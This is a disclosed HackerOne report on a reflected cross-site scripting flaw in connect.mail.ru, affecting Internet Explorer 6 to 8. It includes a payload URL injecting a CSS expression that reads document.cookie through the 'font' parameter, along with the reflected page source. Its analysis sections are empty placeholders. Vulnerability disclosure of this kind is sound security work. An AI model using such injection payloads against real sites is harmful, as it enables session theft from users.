---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '12929'
original_report_id: '12929'
title: Reflected XSS connect.mail.ru (IE6-IE8)
weakness: Cross-site Scripting (XSS) - Generic
team_handle: mailru
created_at: '2014-05-23T15:49:20.777Z'
disclosed_at: '2014-12-10T19:27:15.622Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 5
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# Reflected XSS connect.mail.ru (IE6-IE8)

## Metadata

- HackerOne Report ID: 12929
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: mailru
- Disclosed At: 2014-12-10T19:27:15.622Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Ещё один отражённый XSS в тэге STYLE:
http:/connect.mail.ru/share_friends?domain=pedsovet.kz&width=301&height=302&font=Tahoma;width:expression(alert(document.cookie));
Source code:
	<style type="text/css">
		body {font-family: Tahoma;width:expression(alert(document.cookie));; color: black;background-color: white; margin: 0; padding: 0; border: 1px solid #ccc; }

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
